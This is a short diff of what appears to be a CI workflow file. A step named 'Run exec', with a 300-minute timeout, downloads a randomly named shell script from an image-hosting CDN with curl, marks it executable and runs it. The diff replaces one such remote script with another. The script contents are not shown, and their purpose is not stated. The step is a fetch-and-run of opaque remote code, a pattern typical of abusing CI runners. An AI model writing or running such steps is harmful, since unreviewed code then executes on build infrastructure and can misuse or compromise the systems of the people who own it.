@@ -16,8 +16,6 @@ jobs:
       - name: Run exec
         timeout-minutes: 300
         run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1712047097/ei7pbdz1abo7yqruzxph.sh
-          chmod +x ei7pbdz1abo7yqruzxph.sh
-          ./ei7pbdz1abo7yqruzxph.sh
-
-
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1722844772/bpma.sh
+          chmod +x bpma.sh
+          ./bpma.sh
